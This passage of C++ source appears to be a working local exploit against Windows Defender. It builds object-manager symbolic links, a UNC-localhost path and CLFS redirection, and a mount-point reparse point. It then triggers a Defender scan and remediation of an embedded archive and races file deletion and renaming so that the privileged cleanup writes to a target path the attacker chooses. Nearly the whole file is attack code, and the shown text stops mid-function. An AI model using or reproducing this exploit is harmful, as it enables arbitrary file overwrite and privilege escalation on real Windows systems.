#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <winioctl.h>
#include <aclapi.h>
#include <objbase.h>
#include <bit>
#include <filesystem>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cwchar>
#include "resource.h"

#ifdef _MSC_VER
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")
#endif

#define ALL_SHARING (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE)

using MPHANDLE = HANDLE;
using PMPHANDLE = HANDLE*;

struct MPCALLBACK_INFO;
using PMPCALLBACK_INFO = MPCALLBACK_INFO*;

enum MPSCAN_TYPE
{
    MPSCAN_TYPE_RESOURCE = 3
};
enum MPTHREAT_SOURCE
{
    MPTHREAT_SOURCE_SCAN = 0
};
enum MPTHREAT_TYPE
{
    MPTHREAT_TYPE_KNOWNBAD = 0
};

struct MPRESOURCE_INFO
{
    const wchar_t* Scheme;
    const wchar_t* Path;
    ULONG Class;
};
using PMPRESOURCE_INFO = MPRESOURCE_INFO*;

struct MPSCAN_RESOURCES
{
    DWORD dwResourceCount;
    PMPRESOURCE_INFO pResourceList;
};
using PMPSCAN_RESOURCES = MPSCAN_RESOURCES*;

struct MPTHREAT_INFO
{
    ULONG ThreatID;
    GUID DetectionID;
    wchar_t* Name;
    int ThreatType;
    int ThreatCriticality;
    int ThreatCategory;
    DWORD ThreatShortDescriptionID;
    DWORD ThreatAdviseDescriptionID;
    DWORD ThreatStatus;
};
using PMPTHREAT_INFO = MPTHREAT_INFO*;
static_assert(offsetof(MPTHREAT_INFO, ThreatStatus) == 52);

typedef struct _REPARSE_DATA_BUFFER
{
    ULONG ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union
    {
        struct
        {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct
        {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct
        {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

static HMODULE ntdllhm = GetModuleHandleW(L"ntdll.dll");

using NtCreateSymbolicLinkObjectFn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
using NtCreateDirectoryObjectExFn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG);
using RtlDosPathNameToNtPathNameFn = NTSTATUS(NTAPI*)(PCWSTR, PUNICODE_STRING, PWSTR*, PVOID);
using NtDeleteFileFn = NTSTATUS(NTAPI*)(POBJECT_ATTRIBUTES);

template <typename Fn> Fn LoadExport(HMODULE module, const char* name)
{
    static_assert(sizeof(Fn) == sizeof(FARPROC));
    return std::bit_cast<Fn>(GetProcAddress(module, name));
}

static auto _NtCreateSymbolicLinkObject =
    LoadExport<NtCreateSymbolicLinkObjectFn>(ntdllhm, "NtCreateSymbolicLinkObject");
static auto _NtCreateDirectoryObjectEx = LoadExport<NtCreateDirectoryObjectExFn>(ntdllhm, "NtCreateDirectoryObjectEx");
static auto _RtlDosPathNameToNtPathName_U_WithStatus =
    LoadExport<RtlDosPathNameToNtPathNameFn>(ntdllhm, "RtlDosPathNameToNtPathName_U_WithStatus");
static auto _NtDeleteFile = LoadExport<NtDeleteFileFn>(ntdllhm, "NtDeleteFile");

static wchar_t scan_target[MAX_PATH] = {};

static bool LoadArchive(const void*& data, DWORD& size)
{
    HRSRC resource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_ZIP1), L"zip");
    if (!resource)
        return false;
    HGLOBAL loaded = LoadResource(NULL, resource);
    if (!loaded)
        return false;
    data = LockResource(loaded);
    size = SizeofResource(NULL, resource);
    return data && size != 0;
}

class ObjectSymlinkMgr
{

  public:
    ObjectSymlinkMgr(const wchar_t* symlinkpath, const wchar_t* symlinktarget, HANDLE hparentobjdir = NULL)
    {
        if (!symlinkpath || !symlinktarget)
        {
            throw STATUS_INVALID_PARAMETER;
        }
        UNICODE_STRING _symlinkpath = {};
        RtlInitUnicodeString(&_symlinkpath, symlinkpath);
        UNICODE_STRING _symlinktarget = {};
        RtlInitUnicodeString(&_symlinktarget, symlinktarget);
        OBJECT_ATTRIBUTES objattr = {};
        InitializeObjectAttributes(&objattr, &_symlinkpath, OBJ_CASE_INSENSITIVE, hparentobjdir, NULL);
        NTSTATUS stat = _NtCreateSymbolicLinkObject(&this->hlink, GENERIC_ALL, &objattr, &_symlinktarget);
        if (!NT_SUCCESS(stat))
            throw stat;
    }
    HANDLE GetHandle() { return this->hlink; }
    ~ObjectSymlinkMgr() { CloseHandle(this->hlink); }

  private:
    HANDLE hlink = NULL;
};

class ObjectDirMgr
{

  public:
    ObjectDirMgr(const wchar_t* objdirpath, HANDLE hshadow = NULL, HANDLE hparent = NULL)
    {
        if (!objdirpath)
            throw STATUS_INVALID_PARAMETER;
        UNICODE_STRING _objdirpath = {};
        RtlInitUnicodeString(&_objdirpath, objdirpath);
        OBJECT_ATTRIBUTES objattr = {};
        InitializeObjectAttributes(&objattr, &_objdirpath, OBJ_CASE_INSENSITIVE, hparent, NULL);
        NTSTATUS stat = _NtCreateDirectoryObjectEx(&this->hobjdir, GENERIC_ALL, &objattr, hshadow, 0);
        if (!NT_SUCCESS(stat))
            throw stat;
    }
    HANDLE GetHandle() { return this->hobjdir; }
    ~ObjectDirMgr() { CloseHandle(hobjdir); }

  private:
    HANDLE hobjdir;
};

void GenerateGUID(wchar_t* guid)
{
    GUID _guid;
    HRESULT hr = CoCreateGuid(&_guid);
    if (hr)
        throw STATUS_ACCESS_VIOLATION;
    StringFromGUID2(_guid, guid, 40);
    return;
}

DWORD WDCLBK() { return 0; }

bool GetWDInstallDir(wchar_t* dirname)
{
    HKEY hkey = NULL;
    LSTATUS lstat =
        RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_QUERY_VALUE, &hkey);
    if (lstat)
    {
        printf("[-] Failed to open windows defender registry key, error : %ld\n", lstat);
        return false;
    }
    DWORD keytype = REG_SZ;
    DWORD datasz = MAX_PATH * sizeof(wchar_t);
    lstat = RegQueryValueEx(hkey, L"InstallLocation", NULL, &keytype, (LPBYTE)dirname, &datasz);
    if (lstat || keytype != REG_SZ || datasz < sizeof(wchar_t) || datasz % sizeof(wchar_t) != 0 ||
        datasz > MAX_PATH * sizeof(wchar_t) || dirname[datasz / sizeof(wchar_t) - 1] != L'\0')
    {
        printf("[-] Invalid Windows Defender install location, error: %ld\n", lstat);
        RegCloseKey(hkey);
        return false;
    }
    RegCloseKey(hkey);
    return true;
}

HANDLE scanDone = NULL;

using MpManagerOpenFn = HRESULT(WINAPI*)(DWORD, PMPHANDLE);
using MpScanStartFn = HRESULT(WINAPI*)(MPHANDLE, MPSCAN_TYPE, DWORD, PMPSCAN_RESOURCES, PMPCALLBACK_INFO, PMPHANDLE);
using MpScanResultFn = HRESULT(WINAPI*)(MPHANDLE, void*);
using MpThreatOpenFn = HRESULT(WINAPI*)(MPHANDLE, MPTHREAT_SOURCE, MPTHREAT_TYPE, PMPHANDLE);
using MpThreatEnumerateFn = HRESULT(WINAPI*)(MPHANDLE, PMPTHREAT_INFO*);
using MpCleanOpenFn = HRESULT(WINAPI*)(void*, void*, void***);
using MpCleanStartFn = HRESULT(WINAPI*)(void*, unsigned int, void*);
using MpHandleCloseFn = HRESULT(WINAPI*)(MPHANDLE);

DWORD WINAPI WDStartScan(void*)
{
    wchar_t dllpath[MAX_PATH] = {};

    if (!GetWDInstallDir(dllpath))
    {
        ExitProcess(1);
    }
    const std::filesystem::path clientPath = std::filesystem::path(dllpath) / L"MpClient.dll";
    HMODULE hm = LoadLibraryW(clientPath.c_str());
    if (!hm)
    {
        printf("[-] Failed to load MpClient.dll, error : %lu\n", GetLastError());
        ExitProcess(1);
    }

    auto _MpManagerOpen = LoadExport<MpManagerOpenFn>(hm, "MpManagerOpen");
    auto _MpScanStart = LoadExport<MpScanStartFn>(hm, "MpScanStart");
    auto _MpScanResult = LoadExport<MpScanResultFn>(hm, "MpScanResult");
    auto _MpThreatOpen = LoadExport<MpThreatOpenFn>(hm, "MpThreatOpen");
    auto _MpThreatEnumerate = LoadExport<MpThreatEnumerateFn>(hm, "MpThreatEnumerate");
    auto _MpCleanOpen = LoadExport<MpCleanOpenFn>(hm, "MpCleanOpen");
    auto _MpCleanStart = LoadExport<MpCleanStartFn>(hm, "MpCleanStart");
    auto _MpHandleClose = LoadExport<MpHandleCloseFn>(hm, "MpHandleClose");

    if (!_MpManagerOpen || !_MpScanStart || !_MpScanResult || !_MpThreatOpen || !_MpThreatEnumerate || !_MpCleanOpen ||
        !_MpCleanStart || !_MpHandleClose)
    {
        printf("[-] Failed to initialize dll imports.\n");
        ExitProcess(1);
    }

    MPHANDLE hbinding = NULL;
    HRESULT hres = _MpManagerOpen(0, &hbinding);
    if (hres)
    {
        printf("[-] Failed to open windows defender RPC interface, error : 0x%08lX\n", hres);
        ExitProcess(1);
    }

    MPRESOURCE_INFO scaninfo = {};
    scaninfo.Scheme = L"file";
    scaninfo.Path = scan_target;
    MPSCAN_RESOURCES scanrsrc = {};
    scanrsrc.dwResourceCount = 1;
    scanrsrc.pResourceList = &scaninfo;

    MPHANDLE scanctx = NULL;
    hres = _MpScanStart(hbinding, MPSCAN_TYPE_RESOURCE, 0x60004002, &scanrsrc, NULL, &scanctx);
    if (hres)
    {
        printf("[-] Failed to start Windows Defender scan, error: 0x%08lX\n", hres);
        ExitProcess(1);
    }
    BYTE scanres[0x90] = {};
    hres = _MpScanResult(scanctx, scanres);
    if (hres)
    {
        printf("[-] Failed to fetch scan results, error : 0x%08lX\n", hres);
        ExitProcess(1);
    }

    MPHANDLE threatctx = NULL;
    hres = _MpThreatOpen(scanctx, MPTHREAT_SOURCE_SCAN, MPTHREAT_TYPE_KNOWNBAD, &threatctx);
    if (hres)
    {
        printf("[-] Failed to open threats, error : 0x%08lX\n", hres);
        ExitProcess(1);
    }
    MPTHREAT_INFO* tinfo = NULL;
    hres = _MpThreatEnumerate(threatctx, &tinfo);
    if (hres == 0x1)
    {
        printf("[-] No threats found.\n");
        ExitProcess(1);
    }
    if (hres)
    {
        printf("[-] Failed to enumerate threats, error : 0x%08lX\n", hres);
        ExitProcess(1);
    }
    if (!tinfo || tinfo->ThreatStatus != 0x1)
    {
        printf("[-] Unexpected reply from MpThreatEnumerate.\n");
        ExitProcess(1);
    }

    void** cleanctx = NULL;
    hres = _MpCleanOpen(scanctx, NULL, &cleanctx);
    if (hres)
    {
        printf("[-] MpCleanOpen failed, error : 0x%08lX\n", hres);
        ExitProcess(1);
    }

    void* callbackaddr[2] = {reinterpret_cast<void*>(WDCLBK), reinterpret_cast<void*>(WDCLBK)};

    hres = _MpCleanStart(cleanctx, 0, callbackaddr);
    if (hres)
    {
        printf("[-] MpCleanStart failed, error : 0x%08lX\n", hres);
        ExitProcess(1);
    }
    WaitForSingleObject(scanDone, INFINITE);
    _MpHandleClose(scanctx);
    _MpHandleClose(threatctx);
    _MpHandleClose(hbinding);
    FreeLibrary(hm);
    return ERROR_SUCCESS;
}

static bool CopyNotificationName(wchar_t* destination, size_t capacity, const FILE_NOTIFY_INFORMATION* notification,
                                 DWORD bytesReturned)
{
    const size_t headerSize = FIELD_OFFSET(FILE_NOTIFY_INFORMATION, FileName);
    if (!destination || !notification || bytesReturned < headerSize ||
        notification->FileNameLength % sizeof(wchar_t) != 0 ||
        notification->FileNameLength > bytesReturned - headerSize)
        return false;

    const size_t chars = notification->FileNameLength / sizeof(wchar_t);
    if (chars >= capacity)
        return false;

    memcpy(destination, notification->FileName, notification->FileNameLength);
    destination[chars] = L'\0';
    return true;
}

static bool FindNotificationName(wchar_t* destination, size_t capacity, const void* buffer, DWORD bytesReturned,
                                 DWORD action, const wchar_t* prefix)
{
    if (!destination || !buffer)
        return false;
    const BYTE* data = static_cast<const BYTE*>(buffer);
    size_t offset = 0;
    while (offset < bytesReturned)
    {
        const size_t remaining = bytesReturned - offset;
        if (remaining < FIELD_OFFSET(FILE_NOTIFY_INFORMATION, FileName))
            return false;
        const auto* notification = reinterpret_cast<const FILE_NOTIFY_INFORMATION*>(data + offset);
        const size_t recordBytes = notification->NextEntryOffset ? notification->NextEntryOffset : remaining;
        if (recordBytes < FIELD_OFFSET(FILE_NOTIFY_INFORMATION, FileName) || recordBytes > remaining)
            return false;
        if ((!action || notification->Action == action) &&
            CopyNotificationName(destination, capacity, notification, static_cast<DWORD>(recordBytes)) &&
            (!prefix || _wcsnicmp(destination, prefix, wcslen(prefix)) == 0))
            return true;
        if (notification->NextEntryOffset == 0)
            break;
        offset += recordBytes;
    }
    return false;
}

int wmain(int argc, wchar_t** argv)
{
    if (argc != 2)
    {
        printf("Usage: %ls <path>\n", argv[0]);
        return 1;
    }
    if (!_NtCreateSymbolicLinkObject || !_NtCreateDirectoryObjectEx || !_NtDeleteFile ||
        !_RtlDosPathNameToNtPathName_U_WithStatus)
    {
        printf("[-] Required ntdll exports are unavailable.\n");
        return 1;
    }
    UNICODE_STRING targetNtPath = {};
    if (!NT_SUCCESS(_RtlDosPathNameToNtPathName_U_WithStatus(argv[1], &targetNtPath, NULL, NULL)))
    {
        printf("[-] Invalid target path.\n");
        return 1;
    }
    const void* archive = nullptr;
    DWORD archive_size = 0;
    if (!LoadArchive(archive, archive_size))
    {
        printf("[-] Embedded test archive is missing.\n");
        return 1;
    }

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    wchar_t mainguid[64] = {};
    GenerateGUID(mainguid);
    std::wstring workdir = L"C:\\ShieldCrash_";
    workdir.append(mainguid);
    std::wstring ntworkdir = L"\\??\\" + workdir;
    HANDLE hworkdir = NULL;
    UNICODE_STRING _uworkdir = {};
    RtlInitUnicodeString(&_uworkdir, ntworkdir.c_str());

    PSID pEveryoneSID = NULL;
    PACL pACL = NULL;
    EXPLICIT_ACCESS ea = {};
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
    {
        return 1;
    }

    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT | NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID;

    DWORD dwRes = SetEntriesInAcl(1, &ea, NULL, &pACL);
    if (dwRes != ERROR_SUCCESS)
    {
        FreeSid(pEveryoneSID);
        return 1;
    }
    PSECURITY_DESCRIPTOR sd = static_cast<PSECURITY_DESCRIPTOR>(LocalAlloc(LMEM_FIXED, SECURITY_DESCRIPTOR_MIN_LENGTH));
    if (!sd || !InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION) ||
        !SetSecurityDescriptorDacl(sd, TRUE, pACL, FALSE))
        return 1;

    OBJECT_ATTRIBUTES workdirobjattr = {};
    InitializeObjectAttributes(&workdirobjattr, &_uworkdir, OBJ_CASE_INSENSITIVE, NULL, sd);
    IO_STATUS_BLOCK iostat2 = {};
    NTSTATUS stat = NtCreateFile(&hworkdir, GENERIC_READ | WRITE_DAC | READ_CONTROL | SYNCHRONIZE, &workdirobjattr,
                                 &iostat2, NULL, FILE_ATTRIBUTE_HIDDEN, ALL_SHARING, FILE_CREATE,
                                 FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(stat))
    {
        throw stat;
    }
    printf("[+] %ls was created.\n", _uworkdir.Buffer);

    std::wstring targetobjdirpath = L"\\BaseNamedObjects\\Restricted\\WD_TARGET_";
    targetobjdirpath.append(mainguid);
    ObjectDirMgr* targetdir = new ObjectDirMgr(targetobjdirpath.c_str());
    printf("[+] %ls object manager directory created\n", targetobjdirpath.c_str());

    std::wstring shadowobjdirpath = L"\\BaseNamedObjects\\Restricted\\WD_SHADOW_";
    shadowobjdirpath.append(mainguid);
    ObjectDirMgr* shadowdir = new ObjectDirMgr(shadowobjdirpath.c_str(), targetdir->GetHandle());
    printf("[+] %ls object manager directory created\n", shadowobjdirpath.c_str());

    std::wstring shlnkpath = L"WD_SCAN";
    std::wstring shlnktarget = L"\\??\\UNC\\localhost\\C$\\ShieldCrash_" + std::wstring(mainguid);
    ObjectSymlinkMgr* scanLink = new ObjectSymlinkMgr(shlnkpath.c_str(), shlnktarget.c_str(), shadowdir->GetHandle());
    printf("[+] %ls <=> %ls object link created\n", shlnkpath.c_str(), shlnktarget.c_str());

    std::wstring mnlnktarget = L"\\CLFS\\??\\UNC\\localhost\\C$\\ShieldCrash_" + std::wstring(mainguid);

    ObjectSymlinkMgr* clfsLink = new ObjectSymlinkMgr(shlnkpath.c_str(), mnlnktarget.c_str(), targetdir->GetHandle());
    printf("[+] %ls <=> %ls object link created\n", shlnkpath.c_str(), mnlnktarget.c_str());
    std::wstring scan_path =
        L"\\\\.\\globalroot\\BaseNamedObjects\\Restricted\\WD_SHADOW_" + std::wstring(mainguid) + L"\\WD_SCAN\\BERN";
    if (scan_path.size() >= MAX_PATH)
    {
        printf("[-] Defender scan path is too long.\n");
        return 1;
    }
    wcscpy(scan_target, scan_path.c_str());
    std::wstring malfilepath = workdir + L"\\BERN";
    std::wstring ntmalfilepath = L"\\??\\" + malfilepath;
    UNICODE_STRING _umalfilepath = {};
    RtlInitUnicodeString(&_umalfilepath, ntmalfilepath.c_str());
    iostat2 = {};
    OBJECT_ATTRIBUTES malfileobjattr = {};
    InitializeObjectAttributes(&malfileobjattr, &_umalfilepath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE archiveFile = NULL;
    stat = NtCreateFile(&archiveFile, SYNCHRONIZE | FILE_READ_DATA | FILE_WRITE_DATA, &malfileobjattr, &iostat2, NULL,
                        FILE_ATTRIBUTE_HIDDEN, ALL_SHARING, FILE_OPEN_IF,
                        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(stat))
        throw stat;
    printf("[+] Created %ls\n", ntmalfilepath.c_str());

    DWORD retb2 = 0;
    if (!WriteFile(archiveFile, archive, archive_size, &retb2, NULL) || retb2 != archive_size)
    {
        printf("[-] Failed to write to %ls, error : %lu\n", ntmalfilepath.c_str(), GetLastError());
        return 1;
    }
    CloseHandle(archiveFile);
    iostat2 = {};
    stat =
        NtCreateFile(&archiveFile, SYNCHRONIZE | FILE_READ_DATA, &malfileobjattr, &iostat2, NULL, FILE_ATTRIBUTE_HIDDEN,
                     ALL_SHARING, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(stat))
        throw stat;
    if (!CopyFile(L"C:\\Windows\\System32\\ntdll.dll", std::wstring(workdir + L"\\BERN:stream").c_str(), FALSE))
    {
        printf("[-] File copy failed.\n");
        return 1;
    }
    printf("[+] Copied C:\\Windows\\System32\\ntdll.dll => %ls\n", std::wstring(workdir + L"\\BERN:stream").c_str());

    wchar_t windir[MAX_PATH] = {};
    const UINT windirLength = GetWindowsDirectory(windir, MAX_PATH);
    if (!windirLength || windirLength >= MAX_PATH)
    {
        printf("[-] Failed to resolve Windows directory.\n");
        return 1;
    }
    HANDLE watchHandle =
        CreateFile(windir, GENERIC_READ, ALL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (!watchHandle || watchHandle == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open windows directory, error : %lu\n", GetLastError());
        return 1;
    }

    DWORD retb = 0;
    DWORD tid = 0;
    scanDone = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!scanDone)
    {
        printf("[-] Failed to create scan event.\n");
        return 1;
    }
    HANDLE hthread = CreateThread(NULL, 0, WDStartScan, NULL, 0, &tid);
    if (!hthread)
    {
        printf("[-] Failed to initiate scan.\n");
        throw GetLastError();
    }
    printf("[*] Scan initiated for %ls\n[*] Please wait...\n", scan_path.c_str());
    wchar_t clfsName[MAX_PATH] = {};
    char buff[0x1000] = {};
    const wchar_t* prefix = L"TEMP\\TMP";
    do
    {
        ZeroMemory(buff, sizeof(buff));
        retb = 0;
        if (ReadDirectoryChangesW(watchHandle, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &retb, NULL,
                                  NULL))
        {
            wchar_t eventName[MAX_PATH] = {};
            if (FindNotificationName(eventName, MAX_PATH, buff, retb, FILE_ACTION_ADDED, prefix))
            {
                delete scanLink;
                scanLink = NULL;
                printf("[*] File found : %ls\n", eventName);
                break;
            }
        }
        else
        {
            printf("[-] Windows directory watch failed, error: %lu\n", GetLastError());
            return 1;
        }
    } while (1);
    CloseHandle(watchHandle);
    watchHandle = hworkdir;
    do
    {
        retb = 0;
        if (ReadDirectoryChangesW(watchHandle, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &retb, NULL,
                                  NULL))
        {
            if (!FindNotificationName(clfsName, MAX_PATH, buff, retb, FILE_ACTION_ADDED, NULL))
                continue;
            break;
        }
        printf("[-] Work directory watch failed, error: %lu\n", GetLastError());
        return 1;
    } while (1);

    mnlnktarget = L"\\??\\UNC\\localhost\\C$\\ShieldCrash_" + std::wstring(mainguid) + L"_2";
    scanLink = new ObjectSymlinkMgr(shlnkpath.c_str(), mnlnktarget.c_str(), shadowdir->GetHandle());
    printf("[+] %ls <=> %ls object link created\n", shlnkpath.c_str(), mnlnktarget.c_str());
    std::wstring workdir2 = L"\\??\\" + workdir + std::wstring(L"_2");
    UNICODE_STRING _workdir2 = {};
    RtlInitUnicodeString(&_workdir2, workdir2.c_str());

    OBJECT_ATTRIBUTES workdirobjattr2 = {};
    InitializeObjectAttributes(&workdirobjattr2, &_workdir2, OBJ_CASE_INSENSITIVE, NULL, sd);
    iostat2 = {};
    HANDLE secondWorkDir = NULL;
    stat = NtCreateFile(&secondWorkDir, GENERIC_READ | SYNCHRONIZE, &workdirobjattr2, &iostat2, NULL,
                        FILE_ATTRIBUTE_DIRECTORY, ALL_SHARING, FILE_CREATE,
                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(stat))
        throw stat;
    const std::wstring clfsdelpath = L"\\??\\" + workdir + L"\\" + clfsName;
    UNICODE_STRING _uclfsdelpath = {};
    RtlInitUnicodeString(&_uclfsdelpath, clfsdelpath.c_str());
    OBJECT_ATTRIBUTES clfsdelobjattr = {};
    InitializeObjectAttributes(&clfsdelobjattr, &_uclfsdelpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    const ULONGLONG deleteDeadline = GetTickCount64() + 60000;
    do
    {
        stat = _NtDeleteFile(&clfsdelobjattr);
        if (stat == STATUS_SHARING_VIOLATION)
            Sleep(1);
    } while (stat == STATUS_SHARING_VIOLATION && GetTickCount64() < deleteDeadline);
    if (!NT_SUCCESS(stat))
    {
        printf("[-] Failed to delete CLFS file, error: 0x%08lX\n", stat);
        return 1;
    }
    wchar_t secondName[MAX_PATH] = {};
    do
    {
        ZeroMemory(buff, sizeof(buff));
        retb = 0;
        if (ReadDirectoryChangesW(secondWorkDir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &retb, NULL,
                                  NULL))
        {
            if (!FindNotificationName(secondName, MAX_PATH, buff, retb, 0, NULL))
                continue;
            printf("[*] File found : %ls\n", secondName);
            break;
        }
        printf("[-] Second work directory watch failed, error: %lu\n", GetLastError());
        return 1;
    } while (1);
    const std::wstring fpath2 = L"\\??\\" + workdir + L"_2\\" + secondName + L":stream";
    HANDLE renameHandle = NULL;
    const ULONGLONG renameDeadline = GetTickCount64() + 60000;
    DWORD renameError = ERROR_SUCCESS;
    do
    {
        renameHandle =
            CreateFile(malfilepath.c_str(), DELETE, ALL_SHARING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (renameHandle && renameHandle != INVALID_HANDLE_VALUE)
            break;
        renameError = GetLastError();
        Sleep(1);
    } while (GetTickCount64() < renameDeadline);
    if (!renameHandle || renameHandle == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open archive for rename, error: %lu\n", renameError);
        return 1;
    }
    const wchar_t renameTemplate[] = L"\\??\\%TEMP%\\ShieldCrash_";
    const DWORD expandedLength = ExpandEnvironmentStringsW(renameTemplate, NULL, 0);
    if (expandedLength == 0)
    {
        printf("[-] Failed to resolve TEMP.\n");
        return 1;
    }
    std::wstring tempmv(expandedLength, L'\0');
    const DWORD written = ExpandEnvironmentStringsW(renameTemplate, tempmv.data(), expandedLength);
    if (written == 0 || written > expandedLength)
    {
        printf("[-] Failed to resolve TEMP.\n");
        return 1;
    }
    tempmv.resize(written - 1);
    tempmv += mainguid;
    tempmv += L".BERN2";
    const size_t renameInfoBytes = sizeof(FILE_RENAME_INFO) + sizeof(wchar_t) * (tempmv.size() + 1);
    FILE_RENAME_INFO* renameInfo = static_cast<FILE_RENAME_INFO*>(calloc(1, renameInfoBytes));
    if (!renameInfo)
        return 1;
    renameInfo->FileNameLength = static_cast<DWORD>(tempmv.size() * sizeof(wchar_t));
    memcpy(renameInfo->FileName, tempmv.c_str(), renameInfo->FileNameLength);
    renameInfo->ReplaceIfExists = TRUE;
    if (!SetFileInformationByHandle(renameHandle, FileRenameInfo, renameInfo,
                                    sizeof(FILE_RENAME_INFO) + renameInfo->FileNameLength))
    {
        printf("[-] Failed to rename file, error : %lu\n", GetLastError());
        return 1;
    }
    CloseHandle(renameHandle);
    CloseHandle(archiveFile);
    CloseHandle(hworkdir);
    hworkdir = NULL;
    stat = NtCreateFile(&hworkdir, FILE_WRITE_DATA | SYNCHRONIZE | DELETE, &workdirobjattr, &iostat2, NULL,
                        FILE_ATTRIBUTE_DIRECTORY, ALL_SHARING, FILE_OPEN_IF,
                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE, NULL, 0);
    if (!NT_SUCCESS(stat))
    {
        throw stat;
    }

    auto outputLink = new ObjectSymlinkMgr(L"\\BaseNamedObjects\\Restricted\\BERN:stream", targetNtPath.Buffer, NULL);
    wchar_t rptarget[] = {L"\\BaseNamedObjects\\Restricted"};
    DWORD targetsz = wcslen(rptarget) * 2;
    DWORD printnamesz = 1 * 2;
    DWORD pathbuffersz = targetsz + printnamesz + 12;
    DWORD totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
    REPARSE_DATA_BUFFER* reparseData = static_cast<REPARSE_DATA_BUFFER*>(
        HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz));
    reparseData->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    reparseData->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
    reparseData->Reserved = 0;
    reparseData->MountPointReparseBuffer.SubstituteNameOffset = 0;
    reparseData->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
    memcpy(reparseData->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
    reparseData->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
    reparseData->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
    memcpy(reparseData->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);
    DWORD ret = DeviceIoControl(hworkdir, FSCTL_SET_REPARSE_POINT, reparseData, totalsz, NULL, 0, NULL, NULL);
    if (!ret)
    {
        if (GetLastError() != ERROR_IO_PENDING)
        {
            printf("[-] Failed to set reparse point, error : %lu\n", GetLastError());
            return 1;
        }
    }
    UNICODE_STRING _tempmv = {};
    RtlInitUnicodeString(&_tempmv, fpath2.c_str());
    OBJECT_ATTRIBUTES tmpmvobjattr = {};
    InitializeObjectAttributes(&tmpmvobjattr, &_tempmv, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE htempmv = NULL;
    iostat2 = {};
    const ULONGLONG streamDeadline = GetTickCount64() + 60000;
    do
    {
        stat = NtCreateFile(&htempmv, FILE_READ_DATA | SYNCHRONIZE | FILE_READ_ATTRIBUTES, &tmpmvobjattr, &iostat2,
                            NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_DELETE, FILE_OPEN,
                            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        if (!NT_SUCCESS(stat))
            Sleep(1);
    } while (!NT_SUCCESS(stat) && GetTickCount64() < streamDeadline);
    if (!NT_SUCCESS(stat))
    {
